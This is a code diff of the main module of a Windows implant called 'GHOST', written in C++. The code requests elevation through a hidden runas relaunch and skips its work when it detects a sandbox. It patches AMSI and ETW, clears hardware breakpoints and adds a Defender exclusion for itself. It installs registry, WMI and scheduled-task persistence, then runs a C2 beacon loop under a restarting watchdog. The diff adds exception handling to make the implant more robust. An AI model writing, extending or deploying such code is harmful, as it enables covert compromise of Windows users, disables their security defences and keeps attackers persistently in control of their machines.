@@ -1,7 +1,6 @@
 #include <windows.h>
-#include <stdio.h>
-#include <algorithm>
 #include <shellapi.h>
+#include <algorithm>
 #include "syscalls.hpp"
 #include "evasion.hpp"
 #include "c2.hpp"
@@ -10,40 +9,47 @@
 #include "injection.hpp"
 #include "obfuscate.hpp"
 
-// ─── Debug logging ────────────────────────────────────────────────────────────
-// Opens, writes, closes each call — survives crashes, works in elevated child.
-// OutputDebugStringA fallback lets DebugView catch it if the file fails.
+// ─── Win32-only debug log — zero CRT, survives elevated child, catches crashes ─
 #ifdef DEBUG
-static void DbgLog(const char* msg) {
+static void _DbgWrite(const char* msg) {
     OutputDebugStringA(msg);
-    HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
+    HANDLE hf = CreateFileA(
+        "C:\\Users\\Public\\ghost_debug.log",
         FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hf == INVALID_HANDLE_VALUE) return;
-    DWORD w; WriteFile(hf, msg, (DWORD)strlen(msg), &w, NULL);
-    CloseHandle(hf);
+    if (hf != INVALID_HANDLE_VALUE) {
+        DWORD w;
+        WriteFile(hf, msg, (DWORD)lstrlenA(msg), &w, NULL);
+        CloseHandle(hf);
+    }
 }
-#define DBG(fmt, ...) do { \
-    char _b[512]; \
-    sprintf_s(_b, sizeof(_b), "[pid=%lu] " fmt "\n", GetCurrentProcessId(), ##__VA_ARGS__); \
-    DbgLog(_b); \
-} while(0)
+static void DBG(const char* fmt, ...) {
+    char buf[512];
+    va_list va; va_start(va, fmt);
+    wvsprintfA(buf, fmt, va);  // Win32 only — no CRT
+    va_end(va);
+    lstrcatA(buf, "\r\n");
+    _DbgWrite(buf);
+}
 #else
-#define DBG(fmt, ...) do {} while(0)
+static void DBG(const char*, ...) {}
 #endif
 
+// ─── NtDelayExecution sleep ───────────────────────────────────────────────────
 static void NtSleep(DWORD ms) {
-    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
-    static NtDelayExecution_t pfn = nullptr;
+    typedef NTSTATUS(NTAPI* Fn)(BOOLEAN, PLARGE_INTEGER);
+    static Fn pfn = nullptr;
     if (!pfn) {
         HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
-        if (h) pfn = reinterpret_cast<NtDelayExecution_t>(HashProc(h, FNV("NtDelayExecution")));
+        if (h) pfn = reinterpret_cast<Fn>(HashProc(h, FNV("NtDelayExecution")));
     }
     if (pfn) {
         LARGE_INTEGER li;
         li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
         pfn(FALSE, &li);
-    } else Sleep(ms);
+    } else {
+        Sleep(ms);
+    }
 }
 
 static void DecoyLoop() {
@@ -51,129 +57,182 @@ static void DecoyLoop() {
     for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
 }
 
-// ─── Admin elevation ──────────────────────────────────────────────────────────
+// ─── Elevation ────────────────────────────────────────────────────────────────
 static BOOL EnsureElevated() {
-    DBG("EnsureElevated: IsElevated=%d", (int)IsElevated());
     if (IsElevated()) return TRUE;
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
-    SHELLEXECUTEINFOW sei = {};
-    sei.cbSize      = sizeof(sei);
-    sei.fMask       = SEE_MASK_NOCLOSEPROCESS;
-    sei.lpVerb      = L"runas";
-    sei.lpFile      = exePath;
-    sei.lpParameters = L"--elevated";
-    sei.nShow       = SW_SHOW; // ponytail: SW_HIDE for release
+    SHELLEXECUTEINFOW sei  = {};
+    sei.cbSize             = sizeof(sei);
+    sei.fMask              = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb             = L"runas";
+    sei.lpFile             = exePath;
+    sei.lpParameters       = L"--elevated";
+    sei.nShow              = SW_SHOW; // ponytail: SW_HIDE for release
     BOOL ok = ShellExecuteExW(&sei);
-    DBG("EnsureElevated: ShellExecuteExW=%d err=%lu", ok, GetLastError());
+    DBG("ShellExecuteExW=%d err=%lu", ok, GetLastError());
     if (ok) { Sleep(1000); return FALSE; }
-    MessageBoxW(NULL, L"GHOST requires administrator privileges.", L"Elevation Required", MB_ICONERROR | MB_OK);
+    MessageBoxW(NULL, L"GHOST requires administrator privileges.",
+                L"Elevation Required", MB_ICONERROR | MB_OK);
     return FALSE;
 }
 
+// ─── Implant thread ───────────────────────────────────────────────────────────
 DWORD WINAPI ImplantThread(LPVOID) {
-    DBG("ImplantThread started");
+    DBG("ImplantThread pid=%lu tid=%lu", GetCurrentProcessId(), GetCurrentThreadId());
 
+#ifdef DEBUG
+    // Skip sandbox check in debug — it would deep-sleep the test machine
+    DBG("SandboxCheck skipped (DEBUG)");
+#else
     if (SandboxCheck()) {
-        DBG("Sandbox detected – deep sleep");
         DeepSleep();
         return 1;
     }
+#endif
 
     DBG("DecoyLoop start");
     DecoyLoop();
     DBG("DecoyLoop done");
 
+    // ── Syscalls ──────────────────────────────────────────────────────────────
     DBG("InitializeSyscalls start");
-    while (!InitializeSyscalls()) {
-        DBG("InitializeSyscalls failed – retry in 5s");
-        NtSleep(5000);
+    __try {
+        int attempts = 0;
+        while (!InitializeSyscalls()) {
+            DBG("InitializeSyscalls failed attempt=%d retrying in 5s", ++attempts);
+            if (attempts >= 5) {
+                DBG("InitializeSyscalls gave up after 5 attempts");
+                return 1;
+            }
+            NtSleep(5000);
+        }
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        DBG("InitializeSyscalls EXCEPTION code=0x%08X", GetExceptionCode());
+        return 1;
     }
     DBG("InitializeSyscalls done");
 
+    // ── Evasion ───────────────────────────────────────────────────────────────
     DBG("PatchAMSI start");
-    PatchAMSI();
+    __try { PatchAMSI(); } __except(EXCEPTION_EXECUTE_HANDLER) {
+        DBG("PatchAMSI EXCEPTION 0x%08X", GetExceptionCode());
+    }
     DBG("PatchETW start");
-    PatchETW();
+    __try { PatchETW(); } __except(EXCEPTION_EXECUTE_HANDLER) {
+        DBG("PatchETW EXCEPTION 0x%08X", GetExceptionCode());
+    }
     DBG("ClearHardwareBreakpoints start");
-    ClearHardwareBreakpoints();
+    __try { ClearHardwareBreakpoints(); } __except(EXCEPTION_EXECUTE_HANDLER) {
+        DBG("ClearHardwareBreakpoints EXCEPTION 0x%08X", GetExceptionCode());
+    }
     DBG("Evasion done");
 
+    // ── Defender exclusion ────────────────────────────────────────────────────
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
     if (IsElevated()) {
         DBG("AddDefenderExclusion start");
-        AddDefenderExclusion(exePath);
+        __try { AddDefenderExclusion(exePath); } __except(EXCEPTION_EXECUTE_HANDLER) {
+            DBG("AddDefenderExclusion EXCEPTION 0x%08X", GetExceptionCode());
+        }
         DBG("AddDefenderExclusion done");
     }
 
+    // ── Persistence ───────────────────────────────────────────────────────────
     DBG("Persistence start");
-    InstallRegistryPersistence(exePath);
-    if (!IsWmiPersistenceInstalled()) {
-        InstallWmiPersistence(exePath);
-        InstallWmiScriptPersistence(exePath);
-    }
-    if (!IsScheduledTaskInstalled()) {
-        InstallScheduledTaskPersistence(exePath);
+    __try {
+        InstallRegistryPersistence(exePath);
+        if (!IsWmiPersistenceInstalled()) {
+            InstallWmiPersistence(exePath);
+            InstallWmiScriptPersistence(exePath);
+        }
+        if (!IsScheduledTaskInstalled()) {
+            InstallScheduledTaskPersistence(exePath);
+        }
+    } __except(EXCEPTION_EXECUTE_HANDLER) {
+        DBG("Persistence EXCEPTION 0x%08X (non-fatal)", GetExceptionCode());
+        // Non-fatal — continue to beacon even if persistence fails
     }
     DBG("Persistence done");
 
+    // ── Beacon loop ───────────────────────────────────────────────────────────
     DBG("BeaconLoop start");
-    BeaconLoop();
-    DBG("BeaconLoop returned");
+    __try {
+        BeaconLoop();
+    } __except(EXCEPTION_EXECUTE_HANDLER) {
+        DBG("BeaconLoop EXCEPTION 0x%08X", GetExceptionCode());
+        return 1;
+    }
+    DBG("BeaconLoop returned cleanly");
     return 0;
 }
 
+// ─── Entry point ──────────────────────────────────────────────────────────────
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
-    DBG("WinMain entered");
+    DBG("===== WinMain pid=%lu =====", GetCurrentProcessId());
 
-    bool hasElevatedFlag = lpCmdLine && strstr(lpCmdLine, "--elevated") != nullptr;
-    DBG("hasElevatedFlag=%d", (int)hasElevatedFlag);
+    // ── Elevation ─────────────────────────────────────────────────────────────
+    bool elevated = lpCmdLine && lstrlenA(lpCmdLine) > 0 &&
+                    (lstrcmpA(lpCmdLine, "--elevated") == 0 ||
+                     strstr(lpCmdLine, "--elevated") != nullptr);
+    DBG("lpCmdLine=[%s] elevated_flag=%d", lpCmdLine ? lpCmdLine : "(null)", (int)elevated);
 
-    if (!hasElevatedFlag) {
+    if (!elevated) {
         DBG("calling EnsureElevated");
         if (!EnsureElevated()) {
-            DBG("not elevated – parent exiting");
+            DBG("parent exiting after elevation request");
             return 0;
         }
     }
 
-    DBG("admin=%d", (int)IsElevated());
+    DBG("IsElevated=%d", (int)IsElevated());
     SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
 
-    DBG("HASHPROC resolution start");
-    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    DBG("kernel32=%p", hKernel32);
-    if (!hKernel32) { DBG("kernel32 null – exit"); return 0; }
+    // ── Resolve kernel32 procs via hash ───────────────────────────────────────
+    DBG("resolving kernel32 procs");
+    HMODULE hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
+    DBG("kernel32=%lu", (DWORD)(DWORD_PTR)hKernel32);
+    if (!hKernel32) { DBG("kernel32 null"); return 0; }
 
-    auto _CreateThread       = HASHPROC(hKernel32, CreateThread);
+    auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
     auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
-    auto _CloseHandle        = HASHPROC(hKernel32, CloseHandle);
-    auto _GetExitCodeThread  = HASHPROC(hKernel32, GetExitCodeThread);
-    DBG("procs: CT=%p WFSO=%p CH=%p GECT=%p",
-        _CreateThread, _WaitForSingleObject, _CloseHandle, _GetExitCodeThread);
+    auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
+    auto _GetExitCodeThread   = HASHPROC(hKernel32, GetExitCodeThread);
+
+    DBG("CT=%lu WFSO=%lu CH=%lu GECT=%lu",
+        (DWORD)(DWORD_PTR)_CreateThread,
+        (DWORD)(DWORD_PTR)_WaitForSingleObject,
+        (DWORD)(DWORD_PTR)_CloseHandle,
+        (DWORD)(DWORD_PTR)_GetExitCodeThread);
 
     if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
-        DBG("HASHPROC failed – exit");
+        DBG("HASHPROC failed — kernel32 exports not found");
         return 0;
     }
 
-    DBG("entering watchdog loop");
+    // ── Watchdog loop ─────────────────────────────────────────────────────────
+    DBG("entering watchdog");
     DWORD restartCount = 0;
     while (true) {
         if (restartCount > 0) {
-            DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
-            DBG("watchdog backoff %lums (restart #%lu)", backoffMs, restartCount);
-            Sleep(backoffMs);
+            DWORD backoff = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
+            DBG("watchdog backoff %lums restart#%lu", backoff, restartCount);
+            Sleep(backoff);
         }
-        DBG("spawning ImplantThread (restart #%lu)", restartCount);
+        DBG("spawning ImplantThread restart#%lu", restartCount);
         HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
-        if (!hThread) { DBG("CreateThread failed err=%lu", GetLastError()); Sleep(5000); ++restartCount; continue; }
+        if (!hThread) {
+            DBG("CreateThread failed err=%lu", GetLastError());
+            Sleep(5000);
+            ++restartCount;
+            continue;
+        }
         _WaitForSingleObject(hThread, INFINITE);
         DWORD exitCode = 0;
         _GetExitCodeThread(hThread, &exitCode);
         _CloseHandle(hThread);
-        DBG("ImplantThread exited code=%lu", exitCode);
+        DBG("ImplantThread exit code=%lu", exitCode);
         if (exitCode == 0) { DBG("clean exit"); return 0; }
         ++restartCount;
     }
